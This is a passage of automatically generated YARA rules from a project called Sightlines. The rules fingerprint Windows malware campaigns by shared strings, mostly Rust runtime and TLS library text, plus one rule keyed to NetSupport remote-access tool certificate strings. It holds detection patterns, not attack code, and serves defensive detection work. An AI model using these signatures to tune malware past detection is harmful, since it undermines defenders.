        $s2 = "{invalid syntax}{recursion limit reached}?`fmt::Error`s should be impossible without a `fmt::Formatt" ascii
        $s3 = "Invalid COFF section name base-64 offsetInvalid COFF section name base-10 offset__________\\object-0." ascii
        $s4 = "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s5 = "too many active read locks on RwLock_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____" ascii
        $s6 = "advancing IoSlice beyond its length_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____s" ascii
        $s7 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____sys\\thread_local\\key\\windows.rs" ascii
        $s8 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" ascii
        $s9 = "internal error: entered unreachable code_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_" ascii
        $s10 = "B!mid > lencalled `Result::unwrap()` on an `Err` value" ascii
        $s11 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________alloc_____collections\\btree\\map\\entry.rs" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_b1ef651f_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-b1ef651f"
        date = "2026-10-15"
        campaign = "imphash-b1ef651f"
        family = ""
        hash = "430c58333a43e77c7d467e0d3f0b4e4ea345390d3e68ed943dba053c0e5cc8f4"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-b1ef651f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ParseIntErrorkindEmptyInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee7208bf3b6e93" ascii
        $s1 = "'..= | !nullboolcharstr()i8i16i32i64i128isizeu8u16u32u64u128usizef32f64!..._R__R" ascii
        $s2 = "{invalid syntax}{recursion limit reached}?`fmt::Error`s should be impossible without a `fmt::Formatt" ascii
        $s3 = "Invalid COFF section name base-64 offsetInvalid COFF section name base-10 offset__________\\object-0." ascii
        $s4 = "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s5 = "too many active read locks on RwLock_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____" ascii
        $s6 = "advancing IoSlice beyond its length_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____s" ascii
        $s7 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____sys\\thread_local\\key\\windows.rs" ascii
        $s8 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" ascii
        $s9 = "internal error: entered unreachable code_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_" ascii
        $s10 = "B!mid > lencalled `Result::unwrap()` on an `Err` value" ascii
        $s11 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________alloc_____collections\\btree\\map\\entry.rs" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_f91951a2_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-f91951a2"
        date = "2026-10-15"
        campaign = "imphash-f91951a2"
        family = ""
        hash = "0e417b5f0e86cd6589ebbbcb5b0bf606a576eb158edd2c3d2bfc8e0f245e1ab7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-f91951a2.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ParseIntErrorkindEmptyInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee7208bf3b6e93" ascii
        $s1 = "'..= | !nullboolcharstr()i8i16i32i64i128isizeu8u16u32u64u128usizef32f64!..._R__R" ascii
        $s2 = "{invalid syntax}{recursion limit reached}?`fmt::Error`s should be impossible without a `fmt::Formatt" ascii
        $s3 = "Invalid COFF section name base-64 offsetInvalid COFF section name base-10 offset__________\\object-0." ascii
        $s4 = "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s5 = "too many active read locks on RwLock_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____" ascii
        $s6 = "advancing IoSlice beyond its length_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____s" ascii
        $s7 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____sys\\thread_local\\key\\windows.rs" ascii
        $s8 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" ascii
        $s9 = "internal error: entered unreachable code_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_" ascii
        $s10 = "B!mid > lencalled `Result::unwrap()` on an `Err` value" ascii
        $s11 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________alloc_____collections\\btree\\map\\entry.rs" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_0e4f7d14_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-0e4f7d14"
        date = "2026-10-15"
        campaign = "tlsh-0e4f7d14"
        family = ""
        hash = "0234f3afddedb16450e7f9c51ec55a3c935ce568806a7c1888aae048d44ae441"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-0e4f7d14.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ParseIntErrorEmptyInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7" ascii
        $s1 = "i32i64f32f64StackOverflowMemoryOutOfBoundsHeapMisalignedTableOutOfBoundsIndirectCallToNullBadSignatu" ascii
        $s2 = "<assemblyIdentity version=\"1.0.0.0\" name=\"mozglue\" type=\"win32\"/>" ascii
        $s3 = "assertion failed: code < MAX_HUFF_SYMBOLS_2" ascii
        $s4 = "LazyLock instance has previously been poisoned_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/______" ascii
        $s5 = "eCalling Web API crypto.getRandomValues failedrandSecure: VxWorks RNG module is not initializedNode." ascii
        $s6 = "RandomCopyBytes: iOS Security framework failureRtlGenRandom: Windows system function failureRDRAND: " ascii
        $s7 = "assertion failed: self.is_char_boundary(new_len)_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/____" ascii
        $s8 = "a Display implementation returned an error unexpectedly_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f" ascii
        $s9 = "js crypto CommonJS module is unavailableCalling Node.js API crypto.randomFillSync failedNode.js ES m" ascii
        $s10 = "Utf8Errorvalid_up_toerror_lenNoneSomeAccessError_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/____" ascii
        $s11 = "?InvalidArrayIndex_CRASH@detail@mozilla@@YAX_K0@Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1309696 and 12 of them
}

rule Sightlines_imphash_d00dce2d_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-d00dce2d"
        date = "2026-10-15"
        campaign = "imphash-d00dce2d"
        family = ""
        hash = "1b30f8365647b9d05c82f40d1becdc21f7348b17bc7dd1921d7db7351cf5113c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-d00dce2d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ParseIntErrorEmptyInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7" ascii
        $s1 = "i32i64f32f64StackOverflowMemoryOutOfBoundsHeapMisalignedTableOutOfBoundsIndirectCallToNullBadSignatu" ascii
        $s2 = "<assemblyIdentity version=\"1.0.0.0\" name=\"mozglue\" type=\"win32\"/>" ascii
        $s3 = "assertion failed: code < MAX_HUFF_SYMBOLS_2" ascii
        $s4 = "LazyLock instance has previously been poisoned_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/______" ascii
        $s5 = "eCalling Web API crypto.getRandomValues failedrandSecure: VxWorks RNG module is not initializedNode." ascii
        $s6 = "RandomCopyBytes: iOS Security framework failureRtlGenRandom: Windows system function failureRDRAND: " ascii
        $s7 = "assertion failed: self.is_char_boundary(new_len)_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/____" ascii
        $s8 = "a Display implementation returned an error unexpectedly_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f" ascii
        $s9 = "js crypto CommonJS module is unavailableCalling Node.js API crypto.randomFillSync failedNode.js ES m" ascii
        $s10 = "Utf8Errorvalid_up_toerror_lenNoneSomeAccessError_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/____" ascii
        $s11 = "?InvalidArrayIndex_CRASH@detail@mozilla@@YAX_K0@Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1216512 and 12 of them
}

rule Sightlines_imphash_cddbed78_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-cddbed78"
        date = "2026-10-15"
        campaign = "imphash-cddbed78"
        family = ""
        hash = "0479aeee8dd833c1c2ff564a009ccf98114d02a51ddcbc13fe05e09f20a9efb9"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-cddbed78.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ParseIntErrorkindEmptyInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee7208bf3b6e93" ascii
        $s1 = "'..= | !nullboolcharstr()i8i16i32i64i128isizeu8u16u32u64u128usizef32f64!..._R__R" ascii
        $s2 = "{invalid syntax}{recursion limit reached}?`fmt::Error`s should be impossible without a `fmt::Formatt" ascii
        $s3 = "Invalid COFF section name base-64 offsetInvalid COFF section name base-10 offset__________\\object-0." ascii
        $s4 = "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s5 = "too many active read locks on RwLock_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____" ascii
        $s6 = "advancing IoSlice beyond its length_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____s" ascii
        $s7 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____sys\\thread_local\\key\\windows.rs" ascii
        $s8 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" ascii
        $s9 = "internal error: entered unreachable code_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_" ascii
        $s10 = "B!mid > lencalled `Result::unwrap()` on an `Err` value" ascii
        $s11 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________alloc_____collections\\btree\\map\\entry.rs" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_c68b3b2e_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-c68b3b2e"
        date = "2026-10-15"
        campaign = "imphash-c68b3b2e"
        family = ""
        hash = "0fcd1b326179b367c34fc8a37d38e311138bd1cedf46b89d0d2117456feef577"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-c68b3b2e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ParseIntErrorkindEmptyInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee7208bf3b6e93" ascii
        $s1 = "'..= | !nullboolcharstr()i8i16i32i64i128isizeu8u16u32u64u128usizef32f64!..._R__R" ascii
        $s2 = "{invalid syntax}{recursion limit reached}?`fmt::Error`s should be impossible without a `fmt::Formatt" ascii
        $s3 = "Invalid COFF section name base-64 offsetInvalid COFF section name base-10 offset__________\\object-0." ascii
        $s4 = "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s5 = "too many active read locks on RwLock_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____" ascii
        $s6 = "advancing IoSlice beyond its length_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____s" ascii
        $s7 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____sys\\thread_local\\key\\windows.rs" ascii
        $s8 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" ascii
        $s9 = "internal error: entered unreachable code_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_" ascii
        $s10 = "B!mid > lencalled `Result::unwrap()` on an `Err` value" ascii
        $s11 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________alloc_____collections\\btree\\map\\entry.rs" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_52e4e256_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-52e4e256"
        date = "2026-10-15"
        campaign = "tlsh-52e4e256"
        family = ""
        hash = "212ffc04072e2ef3ec7a97f347286522ddf0e89f4384b10e8b124d818177ccb2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-52e4e256.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "HelloExtensionWrongGroupForKeyShareUnsolicitedEchExtensionAES_128_GCMAES_256_GCMCHACHA20_POLY_1305EX" ascii
        $s1 = "SizeLimitExhaustedParseIntErrorInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee720" ascii
        $s2 = "PskKeyExchangeModeHpkeSymmetricCipherSuitekdf_idaead_idWebPkiSupportedAlgorithms { all: [ .. ], mapp" ascii
        $s3 = "assertion failed: len >= size_of::<c::sockaddr_in>()_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/" ascii
        $s4 = "i1\"AWouldBlockthread name may not contain interior null bytes_______ac68faa20c58cbccd01ee7208bf3b6e9" ascii
        $s5 = "RNG failedWrongAlgorithmInvalidEncodingUnexpectedErrorInvalidComponentPublicKeyIsMissingVersionNotSu" ascii
        $s6 = "ring::signature::ED25519assertion failed: key.len() <= digest_alg.block_len() / 2" ascii
        $s7 = "accept confirmationhrr ech accept confirmationCLIENT_EARLY_TRAFFIC_SECRETCLIENT_HANDSHAKE_TRAFFIC_SE" ascii
        $s8 = "SystemRandomRsaParameterspadding_algmin_bitsNoKeyLogCrlsRequiredRingTLS_NULL_WITH_NULL_NULLTLS_PSK_W" ascii
        $s9 = "LazyLock instance has previously been poisoned_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/______" ascii
        $s10 = "'..= | !nullboolcharstri8i16i32i64i128isizeu64u128usizef32f64!..._R__R" ascii
        $s11 = "assertion failed: self.is_char_boundary(new_len)_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/____" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 3345408 and 12 of them
}

rule Sightlines_imphash_02cdf9b9_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-02cdf9b9"
        date = "2026-10-15"
        campaign = "imphash-02cdf9b9"
        family = ""
        hash = "4cdb91d0a92775a43ca2dd4b92481b849532359649e40d16e307eb59414cc4b4"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-02cdf9b9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "HelloExtensionWrongGroupForKeyShareUnsolicitedEchExtensionAES_128_GCMAES_256_GCMCHACHA20_POLY_1305EX" ascii
        $s1 = "SizeLimitExhaustedParseIntErrorInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee720" ascii
        $s2 = "PskKeyExchangeModeHpkeSymmetricCipherSuitekdf_idaead_idWebPkiSupportedAlgorithms { all: [ .. ], mapp" ascii
        $s3 = "assertion failed: len >= size_of::<c::sockaddr_in>()_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/" ascii
        $s4 = "i1\"AWouldBlockthread name may not contain interior null bytes_______ac68faa20c58cbccd01ee7208bf3b6e9" ascii
        $s5 = "RNG failedWrongAlgorithmInvalidEncodingUnexpectedErrorInvalidComponentPublicKeyIsMissingVersionNotSu" ascii
        $s6 = "ring::signature::ED25519assertion failed: key.len() <= digest_alg.block_len() / 2" ascii
        $s7 = "accept confirmationhrr ech accept confirmationCLIENT_EARLY_TRAFFIC_SECRETCLIENT_HANDSHAKE_TRAFFIC_SE" ascii
        $s8 = "SystemRandomRsaParameterspadding_algmin_bitsNoKeyLogCrlsRequiredRingTLS_NULL_WITH_NULL_NULLTLS_PSK_W" ascii
        $s9 = "ompatibleConfigSniRequiredAlertMessagePayloadEd25519SignerRsaSigningKeyAlertDescriptionAlertLevelEch" ascii
        $s10 = "LazyLock instance has previously been poisoned_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/______" ascii
        $s11 = "'..= | !nullboolcharstri8i16i32i64i128isizeu64u128usizef32f64!..._R__R" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2993152 and 12 of them
}

rule Sightlines_imphash_fece9ea4_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-fece9ea4"
        date = "2026-10-15"
        campaign = "imphash-fece9ea4"
        family = ""
        hash = "28976e498642e6b9900e8738022cece9e54db410e6a6671b3e55e92d7bf96696"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-fece9ea4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ParseIntErrorkindEmptyInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee7208bf3b6e93" ascii
        $s1 = "'..= | !nullboolcharstr()i8i16i32i64i128isizeu8u16u32u64u128usizef32f64!..._R__R" ascii
        $s2 = "{invalid syntax}{recursion limit reached}?`fmt::Error`s should be impossible without a `fmt::Formatt" ascii
        $s3 = "Invalid COFF section name base-64 offsetInvalid COFF section name base-10 offset__________\\object-0." ascii
        $s4 = "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s5 = "too many active read locks on RwLock_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____" ascii
        $s6 = "advancing IoSlice beyond its length_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____s" ascii
        $s7 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____sys\\thread_local\\key\\windows.rs" ascii
        $s8 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" ascii
        $s9 = "internal error: entered unreachable code_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_" ascii
        $s10 = "B!mid > lencalled `Result::unwrap()` on an `Err` value" ascii
        $s11 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________alloc_____collections\\btree\\map\\entry.rs" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_e80dd457_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-e80dd457"
        date = "2026-10-15"
        campaign = "imphash-e80dd457"
        family = ""
        hash = "212ffc04072e2ef3ec7a97f347286522ddf0e89f4384b10e8b124d818177ccb2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-e80dd457.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "HelloExtensionWrongGroupForKeyShareUnsolicitedEchExtensionAES_128_GCMAES_256_GCMCHACHA20_POLY_1305EX" ascii
        $s1 = "SizeLimitExhaustedParseIntErrorInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee720" ascii
        $s2 = "PskKeyExchangeModeHpkeSymmetricCipherSuitekdf_idaead_idWebPkiSupportedAlgorithms { all: [ .. ], mapp" ascii
        $s3 = "assertion failed: len >= size_of::<c::sockaddr_in>()_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/" ascii
        $s4 = "i1\"AWouldBlockthread name may not contain interior null bytes_______ac68faa20c58cbccd01ee7208bf3b6e9" ascii
        $s5 = "RNG failedWrongAlgorithmInvalidEncodingUnexpectedErrorInvalidComponentPublicKeyIsMissingVersionNotSu" ascii
        $s6 = "ring::signature::ED25519assertion failed: key.len() <= digest_alg.block_len() / 2" ascii
        $s7 = "accept confirmationhrr ech accept confirmationCLIENT_EARLY_TRAFFIC_SECRETCLIENT_HANDSHAKE_TRAFFIC_SE" ascii
        $s8 = "SystemRandomRsaParameterspadding_algmin_bitsNoKeyLogCrlsRequiredRingTLS_NULL_WITH_NULL_NULLTLS_PSK_W" ascii
        $s9 = "LazyLock instance has previously been poisoned_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/______" ascii
        $s10 = "eCalling Web API crypto.getRandomValues failedrandSecure: VxWorks RNG module is not initializedNode." ascii
        $s11 = "'..= | !nullboolcharstri8i16i32i64i128isizeu64u128usizef32f64!..._R__R" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 3345408 and 12 of them
}

rule Sightlines_imphash_f9cb6b7c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-f9cb6b7c"
        date = "2026-10-15"
        campaign = "imphash-f9cb6b7c"
        family = ""
        hash = "63c546cf0f1c2051c734ec9ed09bbdf4278d55c4c0215f34da903a18701d8ecf"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-f9cb6b7c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ParseIntErrorkindEmptyInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee7208bf3b6e93" ascii
        $s1 = "'..= | !nullboolcharstr()i8i16i32i64i128isizeu8u16u32u64u128usizef32f64!..._R__R" ascii
        $s2 = "eCalling Web API crypto.getRandomValues failedrandSecure: VxWorks RNG module is not initializedNode." ascii
        $s3 = "RandomCopyBytes: iOS Security framework failureRtlGenRandom: Windows system function failureRDRAND: " ascii
        $s4 = "js crypto CommonJS module is unavailableCalling Node.js API crypto.randomFillSync failedNode.js ES m" ascii
        $s5 = "{invalid syntax}{recursion limit reached}?`fmt::Error`s should be impossible without a `fmt::Formatt" ascii
        $s6 = "failed multiple times: CPU issue likelyRDRAND: instruction not supportedWeb Crypto API is unavailabl" ascii
        $s7 = "Invalid COFF section name base-64 offsetInvalid COFF section name base-10 offset__________\\object-0." ascii
        $s8 = "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s9 = "too many active read locks on RwLock_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____" ascii
        $s10 = "advancing IoSlice beyond its length_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____s" ascii
        $s11 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____sys\\thread_local\\key\\windows.rs" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_e0d0c96a_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-e0d0c96a"
        date = "2026-10-15"
        campaign = "imphash-e0d0c96a"
        family = ""
        hash = "438f93bee0de18996480254eaa716c2d19673e6f237a5e943886bbc905b50f7e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-e0d0c96a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ParseIntErrorkindEmptyInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee7208bf3b6e93" ascii
        $s1 = "'..= | !nullboolcharstr()i8i16i32i64i128isizeu8u16u32u64u128usizef32f64!..._R__R" ascii
        $s2 = "{invalid syntax}{recursion limit reached}?`fmt::Error`s should be impossible without a `fmt::Formatt" ascii
        $s3 = "Invalid COFF section name base-64 offsetInvalid COFF section name base-10 offset__________\\object-0." ascii
        $s4 = "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s5 = "too many active read locks on RwLock_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____" ascii
        $s6 = "advancing IoSlice beyond its length_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____s" ascii
        $s7 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____sys\\thread_local\\key\\windows.rs" ascii
        $s8 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" ascii
        $s9 = "internal error: entered unreachable code_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_" ascii
        $s10 = "B!mid > lencalled `Result::unwrap()` on an `Err` value" ascii
        $s11 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________alloc_____collections\\btree\\map\\entry.rs" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_36c10456_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-36c10456"
        date = "2026-10-15"
        campaign = "imphash-36c10456"
        family = ""
        hash = "0169f50c97b68a2aca5a2429a64141bc2bc348d3f315897186a9b7ab49a357e2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-36c10456.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ParseIntErrorkindEmptyInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee7208bf3b6e93" ascii
        $s1 = "'..= | !nullboolcharstr()i8i16i32i64i128isizeu8u16u32u64u128usizef32f64!..._R__R" ascii
        $s2 = "eCalling Web API crypto.getRandomValues failedrandSecure: VxWorks RNG module is not initializedNode." ascii
        $s3 = "RandomCopyBytes: iOS Security framework failureRtlGenRandom: Windows system function failureRDRAND: " ascii
        $s4 = "js crypto CommonJS module is unavailableCalling Node.js API crypto.randomFillSync failedNode.js ES m" ascii
        $s5 = "{invalid syntax}{recursion limit reached}?`fmt::Error`s should be impossible without a `fmt::Formatt" ascii
        $s6 = "failed multiple times: CPU issue likelyRDRAND: instruction not supportedWeb Crypto API is unavailabl" ascii
        $s7 = "Invalid COFF section name base-64 offsetInvalid COFF section name base-10 offset__________\\object-0." ascii
        $s8 = "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s9 = "too many active read locks on RwLock_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____" ascii
        $s10 = "advancing IoSlice beyond its length_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____s" ascii
        $s11 = "_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/________std_____sys\\thread_local\\key\\windows.rs" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_4f573fff_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-4f573fff"
        date = "2026-10-15"
        campaign = "imphash-4f573fff"
        family = ""
        hash = "49075bd5d9382369b66d4fad8c5482647d361d0250ccc1cb82b09ba455fc93ac"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-4f573fff.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ParseIntErrorEmptyInvalidDigitPosOverflowNegOverflowZero_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7" ascii
        $s1 = "i32i64f32f64StackOverflowMemoryOutOfBoundsHeapMisalignedTableOutOfBoundsIndirectCallToNullBadSignatu" ascii
        $s2 = "<assemblyIdentity version=\"1.0.0.0\" name=\"mozglue\" type=\"win32\"/>" ascii
        $s3 = "assertion failed: code < MAX_HUFF_SYMBOLS_2" ascii
        $s4 = "LazyLock instance has previously been poisoned_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/______" ascii
        $s5 = "t overflow during multiplicationdivision by zeroremainder by zero_______ac68faa20c58cbccd01ee7208bf3" ascii
        $s6 = "eCalling Web API crypto.getRandomValues failedrandSecure: VxWorks RNG module is not initializedNode." ascii
        $s7 = "RandomCopyBytes: iOS Security framework failureRtlGenRandom: Windows system function failureRDRAND: " ascii
        $s8 = "assertion failed: self.is_char_boundary(new_len)_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/____" ascii
        $s9 = "a Display implementation returned an error unexpectedly_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f" ascii
        $s10 = "js crypto CommonJS module is unavailableCalling Node.js API crypto.randomFillSync failedNode.js ES m" ascii
        $s11 = "Utf8Errorvalid_up_toerror_lenNoneSomeAccessError_______ac68faa20c58cbccd01ee7208bf3b6e93a7d7f96/____" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1221632 and 12 of them
}

rule Sightlines_signer_cert_sha1_9325759a_netsupport
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-9325759a"
        date = "2026-10-15"
        campaign = "signer_cert_sha1-9325759a"
        family = "netsupport"
        hash = "06a0a243811e9c4738a9d413597659ca8d07b00f640b74adc9cb351c179b3268"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-9325759a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = ".Netsupport House Towngate East, Market Deeping1" ascii
        $s1 = "!Copyright (c) 2023 NetSupport Ltd" wide
        $s2 = "is@netsupportsoftware.com0" ascii
        $s3 = "Private Organization1" ascii
        $s4 = "NETSUPPORT LTD.1(0&" ascii
        $s5 = "Peterborough1705" ascii
        $s6 = "341209171340Z0]1" ascii
        $s7 = "250617130115Z0" ascii
        $s8 = "220617130115Z" ascii
        $s9 = "300728000000Z0\\1" ascii
        $s10 = "231107171340Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 10 of them
}

rule Sightlines_tlsh_47b088c3_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
